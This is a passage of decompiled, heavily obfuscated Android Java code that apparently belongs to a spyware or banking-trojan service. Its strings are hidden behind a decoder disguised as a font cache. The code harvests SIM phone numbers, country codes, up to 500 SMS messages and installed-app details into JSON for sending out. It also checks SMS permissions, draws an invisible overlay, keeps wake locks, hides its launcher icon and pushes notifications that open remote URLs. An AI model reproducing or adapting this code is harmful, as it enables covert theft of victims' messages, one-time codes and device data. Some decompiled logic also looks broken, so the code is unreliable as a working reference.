                                    if (yi1ktronlsjx != null) {
                                        str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                                    } else {
                                        str2 = null;
                                    }
                                    String strObtain6 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                                    if (str2 == null) {
                                        str = str2;
                                    }
                                    jSONObject.put(strObtain6, str);
                                    jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                                    jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                                    jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                                    jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                                    jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                                    if (arrayList2.size() > 1) {
                                        jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                                    }
                                    if (str2 != null) {
                                        y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                                    }
                                }
                            }
                        } catch (Exception e2) {
                            TypefaceCache.obtain("001000630059009400F300AD00DB00B70037007F0054008900DD00BE00DC00A600240073004900C900F700BA00C60097002B00790055008200DE00AA00DF00A500260064001B00A600C00096008100F400630070005A008E00FC00BA00D600FD0063");
                            e2.getMessage();
                        }
                    } else {
                        SubscriptionManager subscriptionManager9 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                        if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                            it = activeSubscriptionInfoList.iterator();
                            while (it.hasNext()) {
                                number = ((SubscriptionInfo) it.next()).getNumber();
                                if (number != null) {
                                    String strMSGkxvPxRYNqC9 = MSGkxvPxRYNqC(number, false);
                                    arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                    arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC9));
                                }
                            }
                        }
                        simCountryIso = telephonyManager.getSimCountryIso();
                        str = "";
                        if (simCountryIso != null) {
                            lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase = "";
                        }
                        networkCountryIso = telephonyManager.getNetworkCountryIso();
                        if (networkCountryIso != null) {
                            lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase2 = "";
                        }
                        size = arrayList2.size();
                        i = 0;
                        do {
                            if (i < size) {
                                obj = null;
                                break;
                            }
                            obj = arrayList2.get(i);
                            i++;
                        } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                        yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                        if (yi1ktronlsjx != null) {
                            str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                        } else {
                            str2 = null;
                        }
                        String strObtain7 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                        if (str2 == null) {
                            str = str2;
                        }
                        jSONObject.put(strObtain7, str);
                        jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                        jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                        jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                        jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                        jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                        if (arrayList2.size() > 1) {
                            jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                        }
                        if (str2 != null) {
                            y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                        }
                    }
                } else if (Build.VERSION.SDK_INT >= 6 + 27) {
                    SubscriptionManager subscriptionManager10 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                    if (checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0) {
                        SubscriptionManager subscriptionManager11 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                        if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                            it = activeSubscriptionInfoList.iterator();
                            while (it.hasNext()) {
                                number = ((SubscriptionInfo) it.next()).getNumber();
                                if (number != null) {
                                    String strMSGkxvPxRYNqC10 = MSGkxvPxRYNqC(number, false);
                                    arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                    arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC10));
                                }
                            }
                        }
                        simCountryIso = telephonyManager.getSimCountryIso();
                        str = "";
                        if (simCountryIso != null) {
                            lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase = "";
                        }
                        networkCountryIso = telephonyManager.getNetworkCountryIso();
                        if (networkCountryIso != null) {
                            lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase2 = "";
                        }
                        size = arrayList2.size();
                        i = 0;
                        do {
                            if (i < size) {
                                obj = null;
                                break;
                            }
                            obj = arrayList2.get(i);
                            i++;
                        } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                        yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                        if (yi1ktronlsjx != null) {
                            str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                        } else {
                            str2 = null;
                        }
                        String strObtain8 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                        if (str2 == null) {
                            str = str2;
                        }
                        jSONObject.put(strObtain8, str);
                        jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                        jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                        jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                        jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                        jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                        if (arrayList2.size() > 1) {
                            jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                        }
                        if (str2 != null) {
                            y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                        }
                    } else {
                        SubscriptionManager subscriptionManager12 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                        if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                            it = activeSubscriptionInfoList.iterator();
                            while (it.hasNext()) {
                                number = ((SubscriptionInfo) it.next()).getNumber();
                                if (number != null) {
                                    String strMSGkxvPxRYNqC11 = MSGkxvPxRYNqC(number, false);
                                    arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                    arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC11));
                                }
                            }
                        }
                        simCountryIso = telephonyManager.getSimCountryIso();
                        str = "";
                        if (simCountryIso != null) {
                            lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase = "";
                        }
                        networkCountryIso = telephonyManager.getNetworkCountryIso();
                        if (networkCountryIso != null) {
                            lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                        } else {
                            lowerCase2 = "";
                        }
                        size = arrayList2.size();
                        i = 0;
                        do {
                            if (i < size) {
                                obj = null;
                                break;
                            }
                            obj = arrayList2.get(i);
                            i++;
                        } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                        yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                        if (yi1ktronlsjx != null) {
                            str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                        } else {
                            str2 = null;
                        }
                        String strObtain9 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                        if (str2 == null) {
                            str = str2;
                        }
                        jSONObject.put(strObtain9, str);
                        jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                        jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                        jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                        jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                        jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                        if (arrayList2.size() > 1) {
                            jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                        }
                        if (str2 != null) {
                            y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                        }
                    }
                } else {
                    SubscriptionManager subscriptionManager13 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                    if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                        it = activeSubscriptionInfoList.iterator();
                        while (it.hasNext()) {
                            number = ((SubscriptionInfo) it.next()).getNumber();
                            if (number != null) {
                                String strMSGkxvPxRYNqC12 = MSGkxvPxRYNqC(number, false);
                                arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC12));
                            }
                        }
                    }
                    simCountryIso = telephonyManager.getSimCountryIso();
                    str = "";
                    if (simCountryIso != null) {
                        lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                    } else {
                        lowerCase = "";
                    }
                    networkCountryIso = telephonyManager.getNetworkCountryIso();
                    if (networkCountryIso != null) {
                        lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                    } else {
                        lowerCase2 = "";
                    }
                    size = arrayList2.size();
                    i = 0;
                    do {
                        if (i < size) {
                            obj = null;
                            break;
                        }
                        obj = arrayList2.get(i);
                        i++;
                    } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                    yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                    if (yi1ktronlsjx != null) {
                        str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                    } else {
                        str2 = null;
                    }
                    String strObtain10 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                    if (str2 == null) {
                        str = str2;
                    }
                    jSONObject.put(strObtain10, str);
                    jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                    jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                    jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                    jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                    jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                    if (arrayList2.size() > 1) {
                        jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                    }
                    if (str2 != null) {
                        y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                    }
                }
            } catch (Exception e3) {
                TypefaceCache.obtain("00240073004F00AB00F900B100D700F6000D00630056008500F500AD009200A10022007F0057008200F400E50092");
                e3.getMessage();
            }
        } catch (Exception e4) {
            TypefaceCache.obtain("00240073004F00B700F800B000DC00A2000D00630056008500F500AD00FF00B2002F0062005200AA00F500AB00DA00A800270036005E009500E200B000C000FD0063");
            e4.getMessage();
            String strObtain11 = TypefaceCache.obtain("002600640049008800E2");
            String message = e4.getMessage();
            if (message == null) {
                message = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002600640049008800E2");
            }
            jSONObject.put(strObtain11, message);
        }
        return jSONObject;
    }

    public final void fxMPJzvjKAjA(String str, String str2, String str3, String str4, String str5) {
        String strObtain;
        String str6;
        try {
            if (str3.length() > 0) {
                strObtain = TypefaceCache.obtain("003000660054008800F600BA00D60098") + String.valueOf(((long) str3.hashCode()) & 4294967295L);
            } else {
                strObtain = TypefaceCache.obtain("002000790056008A00F100B100D60098002D0079004F008E00F600B600D100A60037007F0054008900E3");
            }
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(new NotificationChannel(strObtain, str3.length() > 0 ? str3 : TypefaceCache.checked("04590428040704D704AD04EB04F9"), 4));
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, strObtain);
            s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = R.drawable.ic_dialog_info;
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str3.length() > 0 ? str3 : str);
            if (str3.length() > 0) {
                str6 = str + "\n" + str2;
            } else {
                str6 = str2;
            }
            s4xe0oepskbhpb3nsd.xDyLpEZyrcKVe0 = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str6);
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = 1;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(16, true);
            if (str3.length() > 0 && str.length() > 0) {
                s4xe0oepskbhpb3nsd.wotphlvK9sPbXJ = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str);
                s4xe0oepskbhpb3nsd.xDyLpEZyrcKVe0 = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(str2);
            }
            if (str4.length() > 0) {
                try {
                    Bitmap bitmap = (Bitmap) Executors.newSingleThreadExecutor().submit(new rziO4QJcO9ArAydJLO(1, str4)).get(6L, TimeUnit.SECONDS);
                    if (bitmap != null) {
                        s4xe0oepskbhpb3nsd.JXn4Qf7zpnLjP5(bitmap);
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("000500770052008B00F500BB009200B3002C0036005F008800E700B100DE00A800220072001B008900FF00AB00DB00A1002A0075005A009300F900B000DC00E7002A00750054008900AA00FF");
                    e.getMessage();
                }
            }
            if (str5.length() > 0) {
                Intent intent = null;
                if (str5.startsWith(TypefaceCache.obtain("002C0066005E008900CF00BE00C200B70079"))) {
                    Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(KgSM0TsKUpCiuePB.Q7qC5ia93qGCjkBXCF0A(str5, TypefaceCache.obtain("002C0066005E008900CF00BE00C200B70079")));
                    if (launchIntentForPackage != null) {
                        launchIntentForPackage.addFlags(268435456);
                        intent = launchIntentForPackage;
                    }
                } else if (str5.startsWith(TypefaceCache.obtain("002C0066005E008900CF00AA00C000AB0079"))) {
                    String strQ7qC5ia93qGCjkBXCF0A = KgSM0TsKUpCiuePB.Q7qC5ia93qGCjkBXCF0A(str5, TypefaceCache.obtain("002C0066005E008900CF00AA00C000AB0079"));
                    if (!strQ7qC5ia93qGCjkBXCF0A.startsWith(TypefaceCache.obtain("002B0062004F009700AA00F0009D")) && !strQ7qC5ia93qGCjkBXCF0A.startsWith(TypefaceCache.obtain("002B0062004F009700E300E5009D00E8"))) {
                        strQ7qC5ia93qGCjkBXCF0A = TypefaceCache.obtain("002B0062004F009700E300E5009D00E8") + strQ7qC5ia93qGCjkBXCF0A;
                    }
                    intent = new Intent("android.intent.action.VIEW", Uri.parse(strQ7qC5ia93qGCjkBXCF0A));
                    intent.addFlags(268435456);
                }
                if (intent != null) {
                    s4xe0oepskbhpb3nsd.ibVTtJUNfrGYbW = PendingIntent.getActivity(this, (int) System.currentTimeMillis(), intent, 1140850688);
                }
            }
            new HEqPccX85NcWnm0(this).dDIMxZXP1V8HdM((int) System.currentTimeMillis(), s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM());
            TypefaceCache.obtain("000600780053008600FE00BC00D700A3006300780054009300F900B900DB00A4002200620052008800FE00FF00C100AF002C0061005500DD00B000BE00C200B7000D00770056008200AD");
            TypefaceCache.obtain("006300620052009300FC00BA008F");
        } catch (Exception e2) {
            TypefaceCache.obtain("0010007E0054009000B000BA00DC00AF002200780058008200F400FF00DC00A80037007F005D008E00F300BE00C600AE002C0078001B008200E200AD00DD00B500790036");
            e2.getMessage();
        }
    }

    public final Notification gIIiyi2ddlMDR0() {
        s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, ECwLkmPW1UKz7J6E);
        s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
        s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
        s4xe0oepskbhpb3nsd.dTS0S7eC32ubQH54j36 = true;
        return s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
    }

    public final void gmNWMfvn6zlEj() {
        int i;
        try {
            WindowManager windowManager = (WindowManager) getSystemService("window");
            SurfaceView surfaceView = new SurfaceView(this);
            surfaceView.setBackgroundColor(1);
            if (XuO9PPFo607ssKwZjNW()) {
                i = 2032;
            } else if (!Settings.canDrawOverlays(this)) {
                return;
            } else {
                i = 2038;
            }
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(5, 5, i, 24, -3);
            layoutParams.gravity = 8388661;
            windowManager.addView(surfaceView, layoutParams);
            this.xDyLpEZyrcKVe0 = surfaceView;
            TypefaceCache.obtain("000A0078004D008E00E300B600D000AB002600360054009100F500AD00DE00A6003A00360058009500F500BE00C600A2002700360013009300E900AF00D700FA");
        } catch (Exception e) {
            TypefaceCache.obtain("00200064005E008600E400BA00FB00A90035007F0048008E00F200B300D70088003500730049008B00F100A6009200A2003100640054009500AA00FF");
            e.getMessage();
        }
    }

    public final boolean hV4VTKNUdeHN() {
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(gA5gCwTK0qjTIn.b1EoSIRjJHO5(this), getPackageName())) {
            boolean z = checkSelfPermission("android.permission.READ_SMS") == 0;
            boolean z2 = checkSelfPermission("android.permission.RECEIVE_SMS") == 0;
            if (!z || !z2) {
                return false;
            }
        }
        return true;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r8v4, types: [boolean, int] */
    public final JSONObject hjneShqpF9Tis4() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        try {
            int i = aPiYFOqe3eIAlt.dDIMxZXP1V8HdM;
            sRwj1o5wkILuZnl srwj1o5wkiluznlDDIMxZXP1V8HdM = aPiYFOqe3eIAlt.dDIMxZXP1V8HdM(this, this.vekpFI4d1Nc4fakF);
            ArrayList arrayList = srwj1o5wkiluznlDDIMxZXP1V8HdM.dDIMxZXP1V8HdM;
            jSONObject.put(TypefaceCache.obtain("0030007B004800B800F300B000C700A90037"), arrayList.size());
            if (arrayList.isEmpty()) {
                jSONObject.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false);
                jSONObject.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000D0079001B00B400DD008C009200A1002C00630055008300B000B000DC00E700270073004D008E00F300BA"));
                TypefaceCache.obtain("0010005B006800C700F100AD00D100AF002A0060005E00DD00B000B100DD00E7002E00730048009400F100B800D700B4006300700054009200FE00BB");
                return jSONObject;
            }
            ?? r8 = 51 - 50;
            try {
                String strEncodeToString = Base64.encodeToString("\ufeff".concat(aPiYFOqe3eIAlt.vekpFI4d1Nc4fakF(srwj1o5wkiluznlDDIMxZXP1V8HdM)).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 2);
                jSONObject.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), (boolean) r8);
                jSONObject.put(TypefaceCache.obtain("0030007B004800B800F100AD00D100AF002A0060005E00B800F600B600DE00A2"), strEncodeToString);
                jSONObject.put(TypefaceCache.obtain("0030007B004800B800F100AD00D100AF002A0060005E00B800F600B600DE00A2002D007700560082"), aPiYFOqe3eIAlt.JXn4Qf7zpnLjP5(this.vekpFI4d1Nc4fakF));
                TypefaceCache.obtain("0010005B006800C700F100AD00D100AF002A0060005E00C700F300B000DE00AB00260075004F008200F400E50092");
                arrayList.size();
                TypefaceCache.obtain("0063007B005E009400E300BE00D500A20030");
                return jSONObject;
            } catch (Throwable th) {
                TypefaceCache.obtain("000100770048008200A600EB009D00A1002C00640056008600E400FF00D400A6002A007A005E008300BC00FF00D400A6002F007A0052008900F700FF00D000A60020007D001B009300FF00FF00C100AA003000490057008E00E300AB008800E7");
                th.getMessage();
                JSONArray jSONArray = new JSONArray();
                int iMin = Math.min(srwj1o5wkiluznlDDIMxZXP1V8HdM.dDIMxZXP1V8HdM.size(), 500);
                for (int i2 = 0; i2 < iMin; i2++) {
                    PBAylXS4TQHeesjIdIs pBAylXS4TQHeesjIdIs = (PBAylXS4TQHeesjIdIs) srwj1o5wkiluznlDDIMxZXP1V8HdM.dDIMxZXP1V8HdM.get(i2);
                    JSONObject jSONObject2 = new JSONObject();
                    String str = pBAylXS4TQHeesjIdIs.dDIMxZXP1V8HdM;
                    if (str == null) {
                        str = "";
                    }
                    jSONObject2.put("a", str);
                    jSONObject2.put("b", KgSM0TsKUpCiuePB.KV57Z6oavcB595B8Dy8Z(pBAylXS4TQHeesjIdIs.w9sT1Swbhx3hs, 1000));
                    jSONObject2.put("d", pBAylXS4TQHeesjIdIs.vekpFI4d1Nc4fakF);
                    jSONObject2.put("t", pBAylXS4TQHeesjIdIs.JXn4Qf7zpnLjP5);
                    jSONArray.put(jSONObject2);
                }
                jSONObject.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), (boolean) r8);
                jSONObject.put(TypefaceCache.obtain("0030007B004800B800FC00B600C100B3"), jSONArray);
                TypefaceCache.obtain("0010005B006800C700F600BE00DE00AB002100770058008C00B000AC00DF00B4001C007A0052009400E400E50092");
                TypefaceCache.obtain("0063007B005E009400E300BE00D500A20030");
                return jSONObject;
            }
        } catch (Throwable th2) {
            jSONObject.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false);
            String strObtain = TypefaceCache.obtain("002600640049008800E2");
            String message = th2.getMessage();
            if (message == null) {
                message = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002600640049008800E2");
            }
            jSONObject.put(strObtain, message);
            TypefaceCache.obtain("002000790057008B00F500BC00C60086002D00720068008200FE00BB00E100AA003000570049008400F800B600C400A2006300730049009500FF00AD008800E7");
            th2.getMessage();
            return jSONObject;
        }
    }

    public final void ibVTtJUNfrGYbW() {
        try {
            PowerManager.WakeLock wakeLock = this.JXn4Qf7zpnLjP5;
            if (wakeLock == null) {
                return;
            }
            if (wakeLock.isHeld()) {
                wakeLock.release();
            }
            wakeLock.acquire(300000L);
        } catch (Exception e) {
            TypefaceCache.obtain("001400770050008200DC00B000D100AC006300770058009600E500B600C000A2006300730049009500FF00AD008800E7");
            e.getMessage();
        }
    }

    public final void is7XW2V21HfKv7MihWy(String str) throws Exception {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("000C0066005E008900B0008A00E0008B006300730049009500FF00AD008800E7");
            e.getMessage();
            throw e;
        }
    }

    public final boolean jdOQeRk37T35X5xKW1P(String str) {
        try {
            Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
            if (launchIntentForPackage == null) {
                TypefaceCache.obtain("00020066004B00C700FE00B000C600E700250079004E008900F400E50092");
                return false;
            }
            launchIntentForPackage.addFlags(268435456);
            startActivity(launchIntentForPackage);
            TypefaceCache.obtain("000C0066005E008900F500BB009200A600330066000100C7");
            return true;
        } catch (Exception e) {
            TypefaceCache.obtain("000C0066005E008900B000BE00C200B7006300730049009500FF00AD008800E7");
            e.getMessage();
            return false;
        }
    }

    public final void k84rwRrqzhrNQ1CdNQ9() {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, TypefaceCache.obtain("00220066004B00C900FD00B000D000AE002F0073004300C900E000B300C700B4006D005B005A008E00FE009E00D100B3002A00600052009300E9")), 2, 1);
            TypefaceCache.obtain("00020066004B00C700F900BC00DD00A90063007E0052008300F400BA00DC");
        } catch (Exception e) {
            TypefaceCache.obtain("000B007F005F008200B000B600D100A8002D0036005E009500E200B000C000FD0063");
            e.getMessage();
        }
    }

    public final JSONObject l1V0lQr6TbwNKqHfXNbb(String str) {
        try {
            PackageManager packageManager = getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(str, 4097);
            ApplicationInfo applicationInfo = packageInfo.applicationInfo;
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("002D007700560082"), applicationInfo.loadLabel(packageManager).toString());
            jSONObject.put(TypefaceCache.obtain("003300770058008C00F100B800D7"), packageInfo.packageName);
            String strObtain = TypefaceCache.obtain("003500730049009400F900B000DC");
            String str2 = packageInfo.versionName;
            String str3 = "";
            if (str2 == null) {
                str2 = "";
            }
            jSONObject.put(strObtain, str2);
            String strObtain2 = TypefaceCache.obtain("0030006F0048009300F500B2");
            boolean z = true;
            if ((applicationInfo.flags & 1) == 0) {
                z = false;
            }
            jSONObject.put(strObtain2, z);
            jSONObject.put(TypefaceCache.obtain("00260078005A008500FC00BA00D6"), applicationInfo.enabled);
            jSONObject.put(TypefaceCache.obtain("002A00780048009300F100B300DE00980037007F00560082"), packageInfo.firstInstallTime);
            jSONObject.put(TypefaceCache.obtain("00360066005F008600E400BA00ED00B3002A007B005E"), packageInfo.lastUpdateTime);
            jSONObject.put(TypefaceCache.obtain("003700770049008000F500AB00ED00B40027007D"), applicationInfo.targetSdkVersion);
            jSONObject.put(TypefaceCache.obtain("002E007F005500B800E300BB00D9"), applicationInfo.minSdkVersion);
            String strObtain3 = TypefaceCache.obtain("00270077004F008600CF00BB00DB00B5");
            String str4 = applicationInfo.dataDir;
            if (str4 == null) {
                str4 = "";
            }
            jSONObject.put(strObtain3, str4);
            String strObtain4 = TypefaceCache.obtain("00300079004E009500F300BA00ED00A3002A0064");
            String str5 = applicationInfo.sourceDir;
            if (str5 != null) {
                str3 = str5;
            }
            jSONObject.put(strObtain4, str3);
            try {
                jSONObject.put(TypefaceCache.obtain("00220066005000B800E300B600C800A2"), new File(applicationInfo.sourceDir).length());
            } catch (Exception unused) {
            }
            String[] strArr = packageInfo.requestedPermissions;
            if (strArr != null) {
                JSONArray jSONArray = new JSONArray();
                for (String str6 : strArr) {
                    jSONArray.put(str6);
                }
                jSONObject.put(TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780048"), jSONArray);
                jSONObject.put(TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780064008400FF00AA00DC00B3"), strArr.length);
            }
            ActivityInfo[] activityInfoArr = packageInfo.activities;
            jSONObject.put(TypefaceCache.obtain("00220075004F008E00E600B600C600BE001C00750054009200FE00AB"), activityInfoArr != null ? activityInfoArr.length : 0);
            return jSONObject;
        } catch (Exception e) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("00020066004B00C700FE00B000C600E700250079004E008900F400E50092") + e.getMessage());
        }
    }

    public final void n8nqApvKDYz7s8llJ2jf() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
            Intent intent = new Intent(this, (Class<?>) SyncQYAdapter.class);
